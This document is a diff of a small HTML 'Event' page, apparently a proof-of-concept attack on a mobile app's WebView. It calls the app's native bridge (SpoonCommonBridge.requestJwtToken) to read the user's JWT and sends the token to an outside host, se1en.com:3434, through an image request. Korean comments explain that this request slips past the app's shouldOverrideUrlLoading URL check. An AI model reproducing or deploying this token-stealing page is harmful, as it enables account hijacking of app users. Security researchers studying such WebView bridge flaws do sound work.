@@ -1,22 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head><title>Event</title></head>
-<body style="background:#fff;color:#000;">
+<body style="background:#fff;color:#000;font-size:16px;padding:10px;font-family:monospace;">
+<div id="s" style="font-size:20px;font-weight:bold;">...</div>
 <script>
+var s = document.getElementById("s");
 try {
   var jwt = window.SpoonCommonBridge.requestJwtToken();
-  if (jwt) {
-    // Split into 3 alerts for readability
-    var chunkSize = Math.ceil(jwt.length / 3);
-    for (var i = 0; i < 3; i++) {
-      var chunk = jwt.substring(i * chunkSize, (i + 1) * chunkSize);
-      alert("JWT" + (i+1) + ":" + chunk);
-    }
+  if (jwt && jwt.length > 10) {
+    s.textContent = "JWT OK (" + jwt.length + " chars)";
+    s.style.color = "green";
+    // img 태그로 JWT를 URL path에 넣어서 exfiltrate
+    // shouldOverrideUrlLoading은 서브리소스(img) 요청을 막지 않음
+    new Image().src = "http://se1en.com:3434/spoon_jwt/" + encodeURIComponent(jwt);
   } else {
-    alert("NO_JWT");
+    s.textContent = "NO JWT";
+    s.style.color = "red";
   }
 } catch(e) {
-  alert("ERR:" + e.message);
+  s.textContent = "ERR: " + e.message;
+  s.style.color = "red";
 }
 </script>
 </body>
